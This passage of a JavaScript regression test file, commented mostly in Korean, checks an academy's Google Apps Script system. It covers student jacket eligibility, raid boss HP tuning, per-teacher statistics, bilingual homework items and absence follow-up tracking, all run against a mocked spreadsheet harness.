  assert.ok(code.includes("safeRun('jacketWatch', jacketWatch_)"), 'jacketWatch_가 어느 트리거에도 안 걸렸다(영원히 안 돎)');
  const blk = section('function jacketWatch_', '/* ===================== 시스템 헬스체크');
  assert.ok(blk.includes("r[3] !== 'student'"), 'role 필터가 없다 — 강사·학부모에게도 과잠이 나간다');
  assert.ok(blk.includes('already.has(sid)'), '멱등 가드가 없다 — 매일 같은 학생이 다시 적재된다');
  assert.ok(blk.includes('Number(r[15])'), '누계는 P열(16)이어야 한다 — 잔액(AQ)을 쓰면 간식을 산 학생이 자격을 잃는다');
  assert.ok(!/appendPoints|\bbal\b/.test(코드만(blk)), '포인트를 건드린다 — 무료 지급이 아니게 된다');
  assert.ok(blk.includes('JACKET_TENURE_MONTHS') && blk.includes('JACKET_MIN_POINTS'), '자격 조건이 상수를 안 쓴다');

  // [리뷰 B2] setupStore()는 코드 정본만 바꾼다 — ▶ 실행 전까지 라이브 contents에 옛 상품이 남아
  //   "사서도 받고 자격으로도 받는" 두 경로가 동시에 열린다. 문서 절차는 안 지켜지므로 기계가 매일 본다.
  assert.ok(blk.includes("String(r[1]) === 'store'") && blk.includes('JACKET_ITEM_NAME'), '스토어 잔존 감시가 없다');
  assert.ok(blk.includes("setState(stJ, '과잠_스토어잔존'"), '잔존 경보에 dedup이 없다(매일 같은 메일)');
  // 과잠을 이미 찜해 둔 학생 — AR은 학생 소유 열이라 스크립트가 못 지운다. 가격 분기로 가면 죽은 카드에 갇힌다.
  assert.ok(code.includes('(goalRaw === JACKET_ITEM_NAME) ?'), '과잠 찜 학생이 자격 카드로 흡수되지 않는다');
});

test('[v9.83] 보스 HP는 지급 단가의 종속 변수 — 상수화 + 만실 격파 가능', () => {
  assert.ok(code.includes('const RAID_HP_PER = {'), '보스 HP 계수가 아직 하드코딩이다(개원 후 실측 재조정 불가)');
  assert.ok(code.includes('RAID_HP_PER.주말 : RAID_HP_PER.평일'), '레이드 HP 계산이 상수를 안 쓴다');
  const PT = constObj_('const PT = {');
  const per = constObj_('const RAID_HP_PER = {');

  // ⚠ 이 추정에 **레이드 보상(PT.레이드)을 넣으면 안 된다** — 격파의 결과를 격파의 원인으로 세는 순환 가정이고,
  //   실제로 첫 판정(평일 34)이 그렇게 부풀려져 리뷰에서 잡혔다. 개인이 스스로 만드는 데미지만 센다.
  //   출석정산도 제외 — 월말 1행 뭉치라 특정 주에만 몰린다(매주 기대할 수 있는 소득이 아니다).
  /* [v9.147] 퀴즈응답(1일 1회)이 수업일 몫에, 재작성(주 1회)이 주간 몫에 들어간다 — 둘 다 **자기 힘으로**
   *   만드는 데미지라 레이드 보상과 달리 순환 가정이 아니다. 이 항을 빼면 첨삭확인 인하(2→1)만 반영돼
   *   보스가 만실에도 안 죽는 것으로 오판된다(실제로 이 테스트가 그렇게 빨간불이 났고, 그게 이 테스트의 일이다). */
  const perDay = PT.숙제 + PT.첨삭확인 + PT.퀴즈응답;  // 수업일마다 자기 힘으로 얻는 몫
  const weeklyOf = (classDays) => perDay * classDays + PT.칭찬 * Math.min(classDays, 2) + PT.인정 * 0.5 + PT.재작성;
  const mix = (w) => w * 0.7;                          // 반 평균은 성실 학생보다 낮다(보통 학생 혼재)

  [['평일', 5.05], ['주말', 1]].forEach(([type, classDays]) => {
    const weekly = mix(weeklyOf(classDays));
    assert.ok(weekly > per[type],
      type + ' 보스 계수 ' + per[type] + '가 1인 주간 획득 추정 ' + weekly.toFixed(1) + 'P를 넘는다 — 만실이어도 매주 격파 실패');
    assert.ok(per[type] > weekly * 0.4,
      type + ' 보스가 너무 쉽다(계수 ' + per[type] + ' vs 주간 ' + weekly.toFixed(1) + 'P) — 격파가 자동이면 레이드 서사가 죽는다');
  });
  // 수업일 비율(1:5)을 계수가 거스르면 주말반이 구조적으로 불리해진다 — v9.83 이전이 정확히 그 상태였다
  assert.ok(per.주말 < per.평일 * 0.45, '주말반 계수가 수업일 비율에 비해 높다(주말반만 격파 불가)');
  // 덜 찬 반 보호 — HP를 정원으로만 잡으면 개원 초 9명 반은 20명분을 내야 한다
  assert.ok(code.includes('if (live > 0 && live < cap) cap = live;'), '보스 HP가 실인원을 안 본다(덜 찬 반 격파 불가)');
});

/* ── [v9.87] 강사 지표 축 교정 — teacher_stats A열('강사')에 반명이 들어가던 결함 ──────────
 * 결함의 성질: 헤더는 '강사'인데 값은 학생 행의 class_name이었다. 시트를 열어봐도 "강사 = 정규반1"이
 * 반명인지 강사명인지 한눈에 안 보여 오래 살아남았다 → 눈으로 하는 점검이 아니라 기계 검사로 이관한다.
 * 아래 하네스는 실제 teacherEmailMap_·classNumOf를 그대로 불러 쓴다(조인 양쪽의 계약까지 함께 고정). */

const STU_COLS = 26;
const mkStu = (id, cls, att, pts, praise) => {
  const r = new Array(STU_COLS).fill('');
  r[0] = id; r[3] = 'student'; r[4] = cls; r[16] = pts; r[21] = att; r[23] = praise;
  return r;
};
const mkTeacher = (id, name, classes, email) => {
  const r = new Array(STU_COLS).fill('');
  r[0] = id; r[1] = name; r[3] = 'teacher'; r[4] = classes; r[6] = email;
  return r;
};
/* [v9.211] `maxCols` — 좁은 시트를 모사하는 자리. 안 주면 30(넉넉)이라 기존 호출부는 그대로다.
 *   🔑 폭 초과 읽기에 **예외를 던진다** — 실제 GAS 가 그렇고(구 11열 시트에서 12열을 요구해 배치가
 *   즉사한 실사고가 있다), 스텁이 조용히 빈칸으로 채우면 「좁은 시트에서 안 죽는다」 검사가 **공허**해진다.
 *   실측: 이 관대함 때문에 폭 클램프를 지우는 변이가 통과했다(회귀가 아무것도 안 지키고 있었다). */
const mkSheet_ = (g, maxCols) => ({
  g,
  getMaxColumns: () => maxCols || 30,
  insertColumnsAfter: () => {},
  getLastRow: () => g.length,
  getLastColumn: () => g.reduce((m, r) => Math.max(m, (r || []).length), 0),
  getRange: (row, col, nR, nC) => (col + (nC || 1) - 1 > (maxCols || 30)
    ? (() => { throw new Error('Exception: 범위의 열 수가 시트 폭을 넘었다 (GAS getRange 모사)'); })()
    : {
    getValues: () => {
      const out = [];
      for (let i = 0; i < (nR || 1); i++) {
        const src = g[row - 1 + i] || [];
        const line = [];
        for (let j = 0; j < (nC || 1); j++) line.push(src[col - 1 + j] === undefined ? '' : src[col - 1 + j]);
        out.push(line);
      }
      return out;
    },
    setValues: (vals) => vals.forEach((line, i) => {
      const ri = row - 1 + i;
      while (g.length <= ri) g.push([]);
      line.forEach((v, j) => { g[ri][col - 1 + j] = v; });
    }),
    clearContent: () => {
      for (let i = 0; i < (nR || 1); i++) {
        if (!g[row - 1 + i]) continue;
        for (let j = 0; j < (nC || 1); j++) g[row - 1 + i][col - 1 + j] = '';
      }
    }
  })
});

/* [v9.211] 시즌 창의 날짜 목록 — 코드가 보는 창(어제부터 ABSENCE_SEASON_DAYS일)과 **같은 규칙**으로 픽스처를 짠다.
 *   8주 = 정확히 40 평일 + 8 토요일이라 오늘이 무슨 요일이든 기대값이 흔들리지 않는다. */
const SEASON_DAYS_T = 56;
const 시즌날_T = () => {
  const out = [];
  for (let i = 1; i <= SEASON_DAYS_T; i++) {
    const d = new Date(Date.now() - i * 86400000);
    out.push({ d, dow: d.getDay() });
  }
  return out;
};
const ymd_T = (d) => d.getFullYear() + '-' + ('0' + (d.getMonth() + 1)).slice(-2) + '-' + ('0' + d.getDate()).slice(-2);

function runTeacherStats_({ profileRows, logs = [], oldStats = [], hwRows = null, checkins = null, sched = null }) {
  const classNumOf = loadFunction('function classNumOf(', 'function hhmmOf_', 'classNumOf', {});
  const pfSheet = mkSheet_([new Array(STU_COLS).fill('헤더')].concat(profileRows));
  const tsSheet = mkSheet_([['강사', '담당학생수', '1인당출석', '1인당포인트', '1인당칭찬', '케어지수', '지난달왕관', '왕관편중%']].concat(oldStats));
  const extra = {
    /* 헤더 폭은 **주어진 행에서 유도하고, 그 폭이 곧 시트 폭이다**(maxCols) — 3열로 고정하면
     * `숙제ID`(12번째) 를 보는 검사를 못 짜고, 폭을 넉넉히 주면 「구 시트에서 넓게 읽어 죽는다」가
     * 재현되지 않는다. 좁은 픽스처는 **좁은 시트 그대로** 남아 폭 클램프를 계속 지킨다. */
    hw_feedback: hwRows && (() => {
      const w = hwRows.reduce((m, r) => Math.max(m, r.length), 3);
      return mkSheet_([['id', 'student_id', '제출일'].concat(new Array(w - 3).fill('h'))].concat(hwRows), w);
    })(),
    teacher_checkins: checkins && mkSheet_([['이름', '구분', '시각']].concat(checkins))
  };
  const ss = {
    getSheetByName: (n) => (n === 'profiles' ? pfSheet : (extra[n] || null)),
    getSpreadsheetTimeZone: () => 'Asia/Ulaanbaatar'
  };
  const teacherEmailMap_ = loadFunction('function teacherEmailMap_(ss)', 'function classPrepMail_', 'teacherEmailMap_', { classNumOf });
  const calcTeacherStats = loadFunction(
    'const TEACHER_STATS_HEADERS', 'function monthlyReport()', 'calcTeacherStats',
    {
      SpreadsheetApp: { getActiveSpreadsheet: () => ss },
      /* [v9.107] 3지표가 'yyyy-MM-dd' 창을 만들므로 포맷별로 답해야 한다(왕관은 'yyyy-MM' 그대로)
       * [v9.211] 숙제·근태는 **날짜와 시각이 판정 재료**라 고정 문자열로는 못 잰다(전 행이 같은 날이 된다).
       *   그래서 진짜로 포맷한다 — 시간대는 하네스 밖(스크립트 시계)이고, 창 계산이 그 축을 쓴다. */
      Utilities: {
        formatDate: (d, tz, fmt) => {
          const x = d instanceof Date ? d : new Date(d);
          /* 🔑 GAS 는 Invalid Date 에 **예외를 던진다.** 스텁이 조용히 'NaN-NaN-NaN' 을 돌려주면
           *   「깨진 행 하나가 전체를 죽인다」는 결함이 하네스 안에서 재현되지 않아 회귀가 거짓 초록이 된다
           *   (변이 실측에서 실제로 빠져나갔다 — 가드를 지워도 초록이었다). */
          if (isNaN(x.getTime())) throw new Error('Exception: 잘못된 날짜 (GAS Utilities.formatDate 모사)');
          const p = (n) => ('0' + n).slice(-2);
          if (fmt === 'yyyy-MM') return x.getFullYear() + '-' + p(x.getMonth() + 1);
          if (fmt === 'HH:mm') return p(x.getHours()) + ':' + p(x.getMinutes());
          return ymd_T(x);
        }
      },
      // [v9.211] 숙제·근태가 시간표에서 분모를 유도한다 — scheduleMap 은 스텁(그 파싱은 반편성 회귀 몫),
      //   schedOf·classDowOk_ 는 **진짜**를 불러 조회·요일 규칙이 갈라지지 않게 못박는다.
      scheduleMap: () => (sched || {}),
      schedOf: loadFunction('function schedOf(', 'function classDowOk_', 'schedOf', { classNumOf }),
      classDowOk_: loadFunction('function classDowOk_(', 'function hasClassToday(', 'classDowOk_', {}),
      asDate_: (d) => (d instanceof Date ? d : new Date(d)),
      TC_NAME_COL: 1, TC_TYPE_COL: 2, TC_TIME_COL: 3,
      ymShift_: () => '2026-06',               // 전월 필터 기준 고정(시계 비의존)
      readPointLogs_: () => logs,
      teacherEmailMap_, classNumOf,
      /* [v9.238·#Q79] 반 키 접기는 공용 통로 `반키_` 하나다(엔진_셋업확장.js). 이 구간 «밖»에 살아
       *   하네스가 넣어 줘야 하는데, **스텁을 지어 넣지 않는다** — 스텁은 사본이라 실물이 퇴행해도
       *   여기는 계속 초록이고, 그 침묵이 정확히 이 통로가 막으려는 실패 모양이다(발화퀄리티.test.js:584 과 같은 규약). */
      반키_: loadFunction('function 반키_(', '/* [v9.237·검수 c59f24d9]', '반키_', {}),
      ensureSheet: () => tsSheet,
      // [v9.107] 3지표 의존 — 이 하네스는 academic_log·absence_followup·enrollments를 주지 않는다(전부 null).
      //   즉 지표 열은 '미측정 빈칸' 경로를 타며, 그 경로가 기존 8열 계산을 깨지 않는지가 여기서 지켜진다.
      ABSENCE_SEASON_DAYS: 56,
      ABSENCE_FOLLOWUP_HEADERS: new Array(10).fill('h'),
      absenceReturnStats_: () => ({}),
      absenceReturnScore_: loadFunction('function absenceReturnState_', 'function checkNoShow()', 'absenceReturnScore_', {}),
      dstr: (v) => String(v == null ? '' : v).slice(0, 10),
      /* [v9.211] 강의 요약 걷어내기가 읽는 둘 — **소스에서 뽑는다.** 손으로 베끼면 정본이 바뀐 날
       *   하네스만 옛 값을 들고 초록이 되고, 그 초록이 급여 경로를 지킨다고 말하게 된다. */
      HW_FEEDBACK_HEADERS: JSON.parse(code.match(/const HW_FEEDBACK_HEADERS = (\[[\s\S]*?\]);/)[1].replace(/'/g, '"')),
      LECTURE_SRC_PREFIX: code.match(/const LECTURE_SRC_PREFIX = '([^']*)'/)[1],
      Logger: { log: () => {} },
      writeIfChanged: (sh, row, col, vals) => { sh.getRange(row, col, vals.length, vals[0].length).setValues(vals); }
    }
  );
  const rows = calcTeacherStats();
  return { rows, sheet: tsSheet.g, byLabel: (label) => rows.filter((r) => r[0] === label)[0] };
}

test('[v9.87] teacher_stats A열은 강사명이다 — 반명이 강사인 척 실리던 결함 재발 차단', () => {
  const { rows, byLabel } = runTeacherStats_({
    profileRows: [
      mkTeacher('T1', '바트', '정규반1, 정규반2', 'bat@synk.im'),
      mkStu('S1', '정규반1', 10, 100, 2),
      mkStu('S2', '정규반1', 20, 200, 4)
    ]
  });
  // 핵심: 라벨이 강사명 '바트'여야 한다. 구버전은 여기에 '정규반1'이 들어갔다.
  assert.ok(byLabel('바트'), "A열에 강사명이 없다 — r[4](class_name)를 강사로 쓰던 결함 재발");
  assert.equal(rows.filter((r) => String(r[0]).indexOf('정규반') === 0).length, 0,
    'A열에 반명이 그대로 실렸다 — 조인(teacherEmailMap_.byClass)이 끊겼다');
  assert.equal(byLabel('바트')[1], 2, '담당학생수가 담당 반 학생 합계가 아니다');
});

test('[v9.87] 집계 정의 — 공동 담당=각자 온전 귀속 · 다반 강사=1행 합산 · 미매칭 반=(미지정)으로 노출', () => {
  const crown = (sid, n) => Array.from({ length: n }, () => ['PL', sid, 5, '👑 시냅스 왕관', '시스템', '', '2026-06']);
  const { rows, sheet, byLabel } = runTeacherStats_({
    profileRows: [
      mkTeacher('T1', '바트', '정규반1, 정규반2', 'bat@synk.im'),   // 다반 + 정규반1 공동 담당
      mkTeacher('T2', '에리카', '정규반1', 'erika@synk.im'),        // 같은 반 공동 담당
      mkStu('S1', '정규반1', 10, 100, 2),
      mkStu('S2', '정규반1', 20, 200, 4),
      mkStu('S3', '정규반2(9시)', 30, 300, 6),                      // 괄호 주석 → 반명 폴백
      mkStu('S6', '심화2', 40, 400, 8),                             // 번호 폴백(2 = 바트 유일)
      mkStu('S4', '주말반9', 5, 50, 1),                             // 담당 강사 없음
      mkStu('S5', '크루1', 7, 70, 3)                                // 번호 1 = 바트·에리카 양쪽 → 폴백 포기
    ],
    logs: [].concat(crown('S1', 3), crown('S2', 1), crown('S3', 1)),
    oldStats: ['정규반1', '정규반2', '심화2', '주말반9', '크루1', '주말반8'].map((c) => [c, 1, 1, 1, 1, 1, 0, 0])
  });

  // ① 한 강사 여러 반 = 한 행으로 합산 + 담당반 열이 조인 결과를 감사 가능하게 남긴다
  const bat = byLabel('바트');
  assert.equal(bat[1], 4, '다반 강사(정규반1·2 + 심화2)의 담당학생수가 합산되지 않았다');
  assert.equal(bat[8], '심화2, 정규반1, 정규반2', '담당반 열이 실제 조인된 반 목록이 아니다');
  // ② 한 반에 강사 여러 명 = 각자 그 반 전원을 온전히(분수 분할 없이) 귀속 → 합계가 재적을 넘는 것이 정상
  const erika = byLabel('에리카');
  assert.equal(erika[1], 2, '공동 담당 강사가 반 전원을 귀속받지 못했다');
  assert.equal(erika[2], 15, '1인당 지표가 공동 담당에서 분수 분할되면 단독 담당과 비교 불가');
  assert.equal(rows.reduce((s, r) => s + r[1], 0), 8, '귀속 정의 변경(합계 8 = 학생 6 + 공동 담당 2중 계상)');
  // ③ 매핑 없는 반 = 반별 (미지정) 행 — 학생이 조용히 사라지지 않는다
  assert.ok(byLabel('(미지정) 주말반9'), '담당 강사 없는 반의 학생이 집계에서 증발했다');
  assert.ok(byLabel('(미지정) 크루1'), '번호가 여러 강사로 갈리는 반이 오귀속되거나 증발했다');
  assert.equal(rows.filter((r) => String(r[0]).indexOf('(미지정)') === 0).length, 2, '(미지정)은 반별 1행이어야 한다');
  // ④ 왕관 편중% = 반 단위 최댓값. 담당 반 학생을 한 통에 섞으면(3/5=60%) 100% 쏠린 반의 경보가 죽는다.
  assert.equal(bat[6], 5, '왕관 총계는 담당 반 합산(정규반1 4 + 정규반2 1)이어야 한다');
  assert.equal(bat[7], 100, '편중%가 반 단위 최댓값이 아니다 — 여러 반에 희석되면 60%↑ 경보가 무력화된다');
  assert.equal(erika[7], 75, '공동 담당 강사의 편중%는 담당 반(정규반1 3/4)의 값이어야 한다');
  // ⑤ 마이그레이션 = 전량 재계산 1회로 끝. 구 반명 행 6개 → 강사 4행, 꼬리 2행은 지워져야 한다.
  assert.equal(sheet[0][8], '담당반', '살아있는 시트의 헤더가 실사용 폭(9열)으로 보정되지 않았다');
  assert.deepEqual(sheet.slice(5).map((r) => String(r[0] || '')), ['', ''], '구 반명 행이 꼬리에 남아 강사인 척 살아 있다');
  assert.equal(sheet.slice(1).filter((r) => String(r[0] || '').indexOf('정규반') === 0).length, 0, '구 반명 라벨이 시트에 잔존한다');
});

test('[v9.87] 축이 흔들리는 지점 3곳 — 조인 소스·헤더 정본 공유·데모 회수 기준', () => {
  const body = section('function calcTeacherStats()', 'function monthlyReport()');
  assert.ok(body.includes('teacherEmailMap_(ss)'), '강사 매핑 정본을 읽지 않는다');
  assert.equal(코드만(body).includes("const teacher = String(r[4])"), false,
    '학생 행 class_name을 강사로 쓰던 구 코드가 되살아났다');
  // 헤더는 골격·실사용이 같은 상수를 봐야 한다 — v9.40 드리프트(구 3열 vs 실사용 8열)의 근본 차단
  assert.ok(code.includes("['teacher_stats', TEACHER_STATS_HEADERS]"), 'SHEET_SKELETON이 헤더 정본 상수를 쓰지 않는다');
  assert.equal(/\['teacher_stats', \[/.test(코드정제), false, 'teacher_stats 헤더 리터럴이 두 곳으로 갈라졌다');
  // 데모 회수: A열이 강사명이 된 뒤로 '데모' 접두만 보면 데모 오염 행이 영구 잔존한다
  const clr = section('function clearDemoData()', 'function bootstrapSynk()');
  assert.ok(/wipe\('teacher_stats'[^\n]*r\[8\]/.test(clr), '데모 회수가 담당반(I열) 기준이 아니다 — 강사명 라벨 행을 못 지운다');
  // 원장 월보의 '이달의 강사'가 (미지정) 행을 1위로 집으면 안 된다
  const exec = section('function buildExecReport_()', 'function setAppState_');
  assert.ok(exec.includes('TEACHER_UNASSIGNED'), "'이달의 강사' 선정이 (미지정) 행을 걸러내지 않는다");
});

test('[v9.88] 숙제·퀴즈 문항 자기완결 — 축약 참조 잔존 0 + 카드 한·몽 병기 배선', () => {
  // 07-31 유호 실측: "오늘 단어 중 2개" · "선생님께 밥 먹었어? 대신?" — 한국인도 못 읽는 축약.
  // 같은 계열 재발(v9.74가 카드 구조를 고쳤는데 문항 원문이 다음 층위로 남음)이라 기계 검사로 못을 박는다.

  // ① QZ22 — 인용 따옴표가 있는 완전문이어야 한다
  assert.ok(code.includes('선생님께 「밥 먹었어?」 대신 뭐라고 할까요?'), 'QZ22 리라이팅이 사라졌다');
  assert.ok(!코드정제.includes('선생님께 밥 먹었어? 대신?'), 'QZ22 구 축약 문항이 되살아났다');

  // ② homework 문항 라인에 "오늘 배운" 없는 축약 참조("오늘 단어/문법/문장/대화문/표현/문형") 잔존 0
  //    ("오늘 배운 단어"에는 "오늘 단어"가 연속 부분열로 없어 자동 통과 — 새 문항 추가 시에도 이 검사가 지킨다)
  const hwLines = code.split('\n').filter(l => /^\s*\['HW\d{3}','homework'/.test(l));
  assert.ok(hwLines.length >= 200, 'homework 뱅크가 통째로 사라졌다: ' + hwLines.length + '행');
  const abbrev = hwLines.filter(l => /오늘 (단어|문법|문장|대화문|표현|문형)/.test(l));
  assert.deepEqual(abbrev.map(l => l.trim().slice(0, 50)), [], '숙제 문항에 수업 연결이 안 보이는 축약 참조가 남았다');

  // ③ 몽골어 뱅크(MN_CONTENTS_G)도 같은 교정 — 학습물 명사 앞 Өнөөдрийн(오늘의)은 사라져야 한다
  const mnLines = code.split('\n').filter(l => /^\s*"HW\d{3}":/.test(l));
  assert.ok(mnLines.length >= 200, '몽골어 숙제 뱅크가 통째로 사라졌다: ' + mnLines.length + '행');
  const mnAbbrev = mnLines.filter(l => /[Өө]нөөдрийн\s+(?:(?:нэг|\d+)\s+)?(үг|хэллэг|дүрм|дүрэм|өгүүлбэр|харилцан)/.test(l));
  assert.deepEqual(mnAbbrev.map(l => l.trim().slice(0, 40)), [], '몽골어 숙제 문항에 축약 참조가 남았다(한·몽 짝 깨짐)');

  // ④ 카드 병기 배선 — 시그니처·게시 키·오결합 가드가 전부 살아 있어야 한다
  assert.ok(code.includes('function hwCardHtml_(ty, mnTy, task, mnTask, tip, mnTip)'), '숙제 카드 mnTask 파라미터가 없다(본문 병기 소실)');
  assert.ok(code.includes('function quizCardHtml_(q, mnQ, personal)'), '퀴즈 카드 mnQ 파라미터가 없다(본문 병기 소실)');
  assert.ok(code.includes("'오늘의퀴즈ID_초급'"), '초급 퀴즈 ID 게시가 없다 — 몽골어 병기 매칭 불가');
  assert.ok(code.includes('quizRaw === begQ9'), '퀴즈 병기에 표시문항 동일성 검사가 없다 — 중·고급 문항에 초급 번역이 붙는다');
  // 병기 몽골어는 "문제|정답" 미러 — 정답부가 카드에 새면 언어정책(정답 평문 노출 금지) 위반
  assert.ok(code.includes('splitQuiz(mnQRaw9)[0]'), '몽골어 퀴즈 병기가 정답부를 자르지 않는다');

  // ⑤ 카드 안내 문구가 실제 버튼 라벨과 일치(07-31 버튼 3종 한 줄 정렬로 라벨이 "✏️ 숙제"로 압축됨)
  assert.ok(!코드정제.includes('✍️ <b>숙제 제출</b> 버튼'), '숙제 카드가 존재하지 않는 옛 버튼명(✍️ 숙제 제출)을 안내한다');
  assert.ok(code.includes('✏️ <b>숙제</b> 버튼'), '숙제 카드 제출 안내가 실제 버튼 라벨(✏️ 숙제)을 가리키지 않는다');
});

/* ── [v9.80] 🔁 결석 추적 — 「결석 복귀율」 측정 레일 ─────────────── */

test('[v9.80] absence_followup 골격 — 감지·연락·복귀 3구간이 한 행에 있고 재건 목록에 편입돼 있다', () => {
  // 결함: checkNoShow가 app_state에 "N명" 카운트만 남겨, 24시간 뒤 대조할 학생별 행이 없었다.
  // 「결석 복귀율」은 등급 심사 20점 · 앱 자동 채점 항목(급여 인센티브 정본 §7) — 돈이 걸린 지표.
  const m = code.match(/const ABSENCE_FOLLOWUP_HEADERS = \[([^\]]+)\]/);
  assert.ok(m, 'ABSENCE_FOLLOWUP_HEADERS(헤더 정본) 선언이 없다');
  ['날짜', 'student_id', '반', '담당강사', '감지시각', '연락여부', '연락시각', '연락수단', '복귀여부'].forEach((h) => {
    assert.ok(m[1].includes(`'${h}'`), `요구 열 '${h}' 누락`);
  });
  const skel = section('function sheetSkeleton_()', 'function bootstrapSynk()');
  /* [vNEXT · #Q100] 세 번째 칸(수집 표식)이 붙을 수 있으므로 **닫는 괄호까지 못박지 않는다** —
   *   이 검사의 뜻은 「재건 목록에 있고 헤더 정본 상수를 쓴다」이지 「칸이 둘이다」가 아니었다. */
  assert.ok(/\['absence_followup', ABSENCE_FOLLOWUP_HEADERS[,\]]/.test(skel),
    '재건 목록(SHEET_SKELETON)에 없으면 원버튼 재건 후 시트가 사라진다');
  assert.ok(!코드만(skel).includes("['absence_followup', ['날짜'"),
    '헤더를 리터럴로 복제하면 두 정본이 갈라진다(단일 소스 유지)');
});

test('[v9.80] 복귀 판정 순수 함수 — 지각 오탐 정정·유예 창·판정 보류가 분모를 오염시키지 않는다', () => {
  const f = loadFunction('function absenceReturnState_(', 'function absenceReturnStats_(', 'absenceReturnState_', {});
  // 같은 날 출석이 뒤늦게 들어옴 = checkNoShow의 구조적 오탐(수업 시작 +30분 판정)
  assert.equal(f('2026-07-01', ['2026-07-01'], '2026-07-20', 14), '지각');
  // 이후 첫 출석 = 복귀(며칠 만인지 함께 기록)
  assert.equal(f('2026-07-01', ['2026-07-03', '2026-07-09'], '2026-07-20', 14), '복귀:2026-07-03(+2일)');
  // 유예 창 밖의 첫 출석은 '다음 수업 복귀'가 아니다
  assert.equal(f('2026-07-01', ['2026-07-30'], '2026-07-31', 14), '미복귀');
  // 유예 창 안 · 아직 출석 없음 = 판정 보류('') → 분모에도 분자에도 안 들어간다
  assert.equal(f('2026-07-01', [], '2026-07-05', 14), '');
  assert.equal(f('2026-07-01', [], '2026-07-15', 14), '미복귀');
  assert.equal(f('', ['2026-07-03'], '2026-07-20', 14), '');
  // 결석일 이전 출석은 복귀 근거가 될 수 없다
  assert.equal(f('2026-07-10', ['2026-07-02'], '2026-07-12', 14), '');
});

test('[v9.80] 강사별 집계·배점 — 무데이터를 0점으로 환산하지 않는다(앱 결함으로 돈을 잃지 않게)', () => {
  const stats = loadFunction('function absenceReturnStats_(', 'function absenceReturnScore_(', 'absenceReturnStats_', {});
  const score = loadFunction('function absenceReturnScore_(', 'function checkNoShow()', 'absenceReturnScore_', {});
  const R = (d, sid, cls, t, contacted, ret) => [d, sid, cls, t, '11:30', contacted, '', '', ret, ''];
  const by = stats([
    R('2026-07-01', 'S1', '정규반1', '재헌', 'O', '복귀:2026-07-02(+1일)'),
    R('2026-07-02', 'S2', '정규반1', '재헌', '', '미복귀'),
    R('2026-07-03', 'S3', '정규반1', '재헌', 'O', '지각'),           // 오탐 — 분모 제외
    R('2026-07-04', 'S4', '정규반1', '재헌', '', ''),                 // 판정 보류 — 분모 제외
    R('2026-06-01', 'S5', '정규반1', '재헌', '', '미복귀'),           // 창 밖
    R('2026-07-01', 'S6', '집중반1', '', 'O', '복귀:2026-07-02(+1일)') // 담당 미배정
  ], '2026-07-01', null);
  assert.equal(by['재헌'].tot, 3, '지각은 결석 건수에서 빠져야 한다');
  assert.equal(by['재헌'].judged, 2, '판정 보류가 분모에 들어갔다');
  assert.equal(by['재헌'].rate, 50);
  assert.equal(by['재헌'].late, 1);
  assert.equal(by['재헌'].pending, 1);
  assert.equal(by['재헌'].contacted, 1);
  assert.ok(by['(담당 미배정)'], '담당강사 공란도 집계에서 사라지면 안 된다(누락이 드러나야 한다)');
  // 급여 인센티브 정본 §7 배점표 — 90%+ 20 / 85~89 16 / 80~84 12 / 75~79 6 / 미만 0
  assert.equal(score(95), 20); assert.equal(score(90), 20);
  assert.equal(score(87), 16); assert.equal(score(82), 12);
  assert.equal(score(76), 6);  assert.equal(score(74), 0);
  assert.equal(score(null), null, '판정 0건은 미측정(null) — 0점이 아니다');
});

test('[v9.80] checkNoShow — 시트 적재가 메일보다 먼저이고, 재시도해도 행이 늘지 않는다', () => {
  const body = section('function checkNoShow()', 'function absenceFollowupNightly_()');
  // 지표 원본이 쿼터·메일 실패에 종속되면 안 된다(메일은 알림, 행은 데이터)
  // [v9.125] 순서 계약 확장 — ①적재가 메일보다 먼저(메일은 알림, 행은 데이터) ②발송 관문(리허설·쿼터)이
  //   마킹(setState)보다 앞에서 return — 닫힌 관문에 키를 찍으면 그날 미등원 알림이 영구 소실된다.
  assertOrder(body, [
    'af.getRange(afRow, 1, add.length',
    "if (!quotaOk(1)) { Logger.log('미등원 통보 보류",
    'MailApp.sendEmail(ADMIN_EMAIL',
    "setState(st, key, absent.length + '명')"
  ]);
  assert.ok(body.includes('if (afSeen[sid]) return;'), '(날짜|sid) 중복 가드가 없다 — 메일 throw 후 재시도가 행을 복제한다');
  assert.ok(body.includes("ensureSheet(ss, 'absence_followup', ABSENCE_FOLLOWUP_HEADERS)"), '적재 시트 보장이 없다');
  // 당일 출석 0건 스킵(v9.34 가드)은 이 지표의 전제 — 지우면 휴강일 전원이 결석으로 적재된다
  assert.ok(body.includes('if (!clsStu.some(r => todayAtt.has(r[0]))) return;'), '당일 출석 0건 스킵 가드가 사라졌다');
  assert.ok(body.includes('사전신고'), '학부모 사전신고(absence_notice) 조인이 없다 — 사유 확인된 결석까지 강사를 쫀다');
});

test('[v9.80] 야간 스캔 — 창 방식 재알림·이행분 제외·복귀 판정 멱등', () => {
  const body = section('function absenceFollowupNightly_()', 'function absenceSection_(');
  assert.ok(body.includes('days < 1 || days > ABSENCE_NAG_DAYS'),
    '정확일 매칭이면 배치가 하루 죽을 때 그 건은 영영 알림 없이 지나간다(MJ_expiryDaily_ 창 방식)');
  assert.ok(body.includes("if (String(r[5] || '').trim()) return;"), '이미 연락한 건까지 다시 쫀다');
  assert.ok(body.includes("if (retCol[i][0] === '지각') return;"), '지각(오탐)에도 연락 독촉이 나간다');
  assert.ok(body.includes("if (String(r[9] || '').indexOf('사전신고') === 0) return;"), '사전신고 결석까지 독촉한다');
  assert.ok(body.includes('if (cur) return [cur];'), '확정된 복귀 판정을 매일 다시 쓰면 멱등이 깨진다');
  assert.ok(body.includes('writeIfChanged(sh, 2, 9, retCol)'), '복귀 열 기록이 writeIfChanged가 아니다(무변경일에도 쓰기 발생)');
  assert.ok(body.includes('!quotaOk(1)'), '강사 메일에 쿼터 가드가 없다 — 강사 대상 자동 메일이 이미 4종 돈다');
  assert.ok(body.includes('ABSENCE_ESCALATE_N'), '반복 결석 원장 에스컬레이션(수업 규칙 「결석자 복귀」 — 3회 연속 원장 보고)이 없다');
  assert.ok(section('function nightJobs()', 'function dailyBackupJob()').includes("safeRun('absenceFollowup'"), '야간 배치 배선 누락');
});

test('[v9.80] 결석 연락 폼 — 항목 고정(응답 열 파싱 계약)·재실행 제자리 업그레이드·10분 전개', () => {
  const cf = section('function createAbsenceForm()', 'function importFormResponses()');
  assertOrder(cf, ['syncAbsenceForm_(ss, st)', 'FormApp.create']); // 있으면 업그레이드, 없을 때만 생성(URL 갈아끼움 사고 차단)
